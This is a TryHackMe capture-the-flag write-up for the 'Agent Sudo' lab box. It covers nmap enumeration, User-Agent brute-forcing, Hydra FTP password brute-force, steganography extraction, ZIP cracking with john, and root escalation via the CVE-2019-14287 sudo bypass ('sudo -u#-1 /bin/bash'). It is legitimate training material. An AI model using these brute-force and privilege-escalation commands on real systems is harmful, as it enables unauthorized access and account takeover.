Agent Sudo — TryHackMe Writeup
Difficulty: Easy
Category: Enumeration, Brute‑Force, Steganography, Privilege Escalation
writepu by : Obada
A secret server lies deep under the sea. Your mission is to infiltrate it, uncover hidden messages, and escalate privileges to reveal the final truth.

0. Enumeration
Target

Nmap Scan
```Code
nmap -v [ip terget]
```
Open Ports:

21/tcp – FTP

22/tcp – SSH

80/tcp – HTTP

Web Enumeration
Visiting the homepage:

```Code
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```
This hints that the User-Agent header must be set to an agent codename (A–Z).
Using BurpSuite Intruder, I brute‑forced User-Agent values from A → Z.

Agent R → returns a long response (warning message).

Agent C → returns 302 redirect to agent_C_attention.php.

Visiting the redirected page reveals:

```Code
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, it is weak!
From, Agent R
```
We now know:

Username: chris

Password: weak

1. Attacking
FTP Brute‑Force
Using Hydra with rockyou.txt:

```Code
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://[ip target]
```
Login successful.

FTP Files
```Code
To_agentJ.txt
cute-alien.jpg
cutie.png
```
To_agentJ.txt hints that the real password is hidden inside the images.

2. Steganography
Binwalk Analysis
```Code
binwalk cute-alien.jpg
binwalk cutie.png
```
cutie.png contains an encrypted ZIP archive.

Extracting:

```Code
binwalk -e cutie.png
```
We get:

365.zlib

8702.zip ← important

Cracking ZIP Password
```Code
zip2john 8702.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
Password found:

```Code
ali**
```
Extracting the ZIP reveals:

```Code
We need to send the picture to 'QXJlYTUx'
```
Decoding Base64:

```Code
echo QXJlYTUx | base64 -d
Area**
```
Extracting Hidden Message from cute-alien.jpg
```Code
steghide --extract -sf cute-alien.jpg
```
Password prompt → use the decoded password.

Extracted file: message.txt

```Code
Hi jam**,
Your login password is hacker******
Your buddy,
chris
```
We now have SSH credentials.

3. User Flag
SSH into the machine:

```Code
ssh jam**@[ip terget]
```
User flag is located in the home directory.

The file Alien_autospy.jpg references the Roswell incident.

4. Privilege Escalation
Checking sudo permissions:

```Code
sudo -l
```
User can run /bin/bash with sudo.
The sudo version is vulnerable to CVE‑2019‑14287.

Exploit:

```Code
sudo -u#-1 /bin/bash
```
Root shell obtained.

Root flag retrieved from /root/root.txt.

5. Final Message
```Code
To Mr.hacker,
Congratulation on rooting this box.
This box was designed for TryHackMe.
Tips, always update your machine.
By, Agent R
```
Conclusion
Agent Sudo is a fun machine that combines:

Web enumeration

Header manipulation

FTP brute‑forcing

Steganography (steghide + binwalk)

Password cracking (John the Ripper)

Privilege escalation via sudo vulnerability

A great beginner-friendly box that touches multiple core pentesting skills.

Happy hacking!
